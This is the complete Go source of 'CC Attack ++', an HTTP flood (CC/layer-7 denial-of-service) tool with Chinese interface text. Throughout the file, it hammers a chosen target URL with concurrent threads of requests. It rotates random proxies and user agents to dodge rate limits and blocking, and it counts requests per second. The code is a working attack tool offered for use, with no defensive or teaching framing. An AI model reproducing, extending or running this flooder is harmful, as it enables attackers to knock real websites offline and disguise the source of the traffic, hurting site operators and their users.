// CC Attack ++ Rewrite Chinese
// Author : MasonDye
// Version : 2.4.0
// GitHub : https://github.com/MasonDye/CC-Attack-Rewrite

package main

import (
	"bufio"
	"flag"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

var version = "2.4.0 Chinese (Releases 2024/05/29 9:15 AM)"

func main() {
	targetURL := flag.String("url", "", "攻击地址")
	requestInterval := flag.Int("speed", 100, "攻击速度(ms)")
	timeout := flag.Int("timeout", 2500, "请求超时 (ms)")
	userAgentFile := flag.String("ua_pool", "", "用户代理池 (txt)")
	proxyListFile := flag.String("ip_pool", "", "IP 代理池 (txt)")
	threadCount := flag.Int("thread", 2, "线程")
	httpVersion := flag.Float64("http_version", 1.1, "HTTP 版本 (1.1 or 2.0)")
	attackTime := flag.Int("time", 0, "攻击时间 (秒)")
	cookie := flag.String("cookie", "", "在请求中附带Cookie")
	method := flag.String("http_methods", "GET", "HTTP 请求类型 (GET, POST, PUT, DELETE, HEAD, OPTIONS, PATCH, TRACE, CONNECT)")

	flag.Parse()

	if *targetURL == "" {
		fmt.Println("\033[31mCC Attack ++ Rewrite Chinese \033[34m版本:", version, "\033[0m")
		fmt.Println("\033[32m作者: MasonDye\033[0m")
		fmt.Println("\033[32mGitHub: https://github.com/MasonDye/CC-Attack-Rewrite\033[0m")
		fmt.Println() // Add blank line

		fmt.Println("\033[31m使用方法:\033[0m")
		flag.VisitAll(func(f *flag.Flag) {
			fmt.Printf("\033[32m  -%s\033[0m\n        %s\n", f.Name, f.Usage)
		})
		return
	}

	// 检查 HTTP 版本类型是否合法
	if *httpVersion != 1.1 && *httpVersion != 2.0 {
		fmt.Println("\033[31m非法的 HTTP 版本. 请使用 1.1 或 2.0.\033[0m")
		return
	}

	// 检查 HTTP 请求类型是否合法
	validMethods := map[string]bool{"GET": true, "POST": true, "PUT": true, "DELETE": true, "HEAD": true, "OPTIONS": true, "PATCH": true, "TRACE": true, "CONNECT": true}
	if !validMethods[strings.ToUpper(*method)] {
		fmt.Println("\033[31m非法的 HTTP 请求类型. 请使用 GET, POST, PUT, DELETE, HEAD, OPTIONS, PATCH, TRACE, or CONNECT.\033[0m")
		return
	}

	var proxyList []string
	if *proxyListFile != "" {
		var err error
		proxyList, err = readProxyList(*proxyListFile)
		if err != nil {
			fmt.Println("在读取IP池文件时错误:", err)
			return
		}
	}

	userAgent := "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
	if *userAgentFile != "" {
		userAgentList, err := readUserAgentList(*userAgentFile)
		if err != nil {
			fmt.Println("在读取用户代理池文件时错误:", err)
			return
		}
		rand.Seed(time.Now().UnixNano())
		userAgent = getRandomUserAgent(userAgentList)
	}

	successCount := 0
	errorCount := 0 // 添加错误计数器
	startTime := time.Now()

	var wg sync.WaitGroup // 添加等待组

	// 打印欢迎信息
	fmt.Println("\033[32mCC Attack ++ \033[31m|\033[34m 版本:", version, "\033[0m")

	// 打印开始攻击
	fmt.Println("\033[31m开始攻击!\033[0m")

	proxyCount := len(proxyList) // 代理计数

	for i := 0; i < *threadCount; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			client := &http.Client{
				Timeout: time.Duration(*timeout) * time.Millisecond,
			}

			for {
				if proxyCount > 0 { // 如果代理可用
					proxyURL := getRandomProxy(proxyList)
					transport := &http.Transport{
						Proxy: http.ProxyURL(proxyURL),
					}
					client.Transport = transport
				}

				reqURL := *targetURL
				if !strings.HasPrefix(*targetURL, "http://") && !strings.HasPrefix(*targetURL, "https://") {
					reqURL = "http://" + *targetURL
				}

				req, err := http.NewRequest(strings.ToUpper(*method), reqURL, nil)
				if err != nil {
					fmt.Println("请求创建错误:", err)
					continue
				}

				req.Header.Set("User-Agent", userAgent)

				// 设置 HTTP 版本
				if *httpVersion == 2.0 {
					req.Proto = "HTTP/2.0"
				} else {
					req.Proto = "HTTP/1.1"
				}

				// 如果设置则添加Cookie到请求
				if *cookie != "" {
					req.Header.Set("Cookie", *cookie)
				}

				resp, err := client.Do(req)
				if err != nil {
					// fmt.Println("请求在发送时错误:", err)
					errorCount++ // 错误计数递增
					continue
				}

				successCount++
				elapsed := time.Since(startTime).Seconds()
				requestsPerSecond := float64(successCount) / elapsed
				// 打印攻击信息
				fmt.Printf("\r\033[31m已发送:%d \033[0m|\033[31m %.1f p/s \033[0m|\033[31m URL:%s \033[0m|\033[31m 线程:%d \033[0m|\033[31m 速度:%d\033[31m ms \033[0m|\033[31m 超时:%d\033[31m ms \033[0m|\033[31m 错误数:%d \033[0m", successCount, requestsPerSecond, reqURL, *threadCount, *requestInterval, *timeout, errorCount)

				resp.Body.Close()

				// 检查是否到达了攻击时间限制
				if *attackTime > 0 && int(time.Since(startTime).Seconds()) >= *attackTime {
					fmt.Println("\n\033[31m停止攻击...\033[0m")
					os.Exit(0)
				}

				time.Sleep(time.Duration(*requestInterval) * time.Millisecond)
			}
		}()
	}

	wg.Wait() // 等待所有协程完成
}

func readProxyList(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var proxyList []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxy := strings.TrimSpace(scanner.Text())
		proxyList = append(proxyList, proxy)
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return proxyList, nil
}

func readUserAgentList(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var userAgentList []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		userAgent := strings.TrimSpace(scanner.Text())
		userAgentList = append(userAgentList, userAgent)
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return userAgentList, nil
}

func getRandomProxy(proxyList []string) *url.URL {
	if len(proxyList) == 0 {
		return nil
	}

	randIndex := rand.Intn(len(proxyList))
	proxyURL, _ := url.Parse("http://" + proxyList[randIndex])
	return proxyURL
}

func getRandomUserAgent(userAgentList []string) string {
	if len(userAgentList) == 0 {
		return ""
	}

	randIndex := rand.Intn(len(userAgentList))
	return userAgentList[randIndex]
}
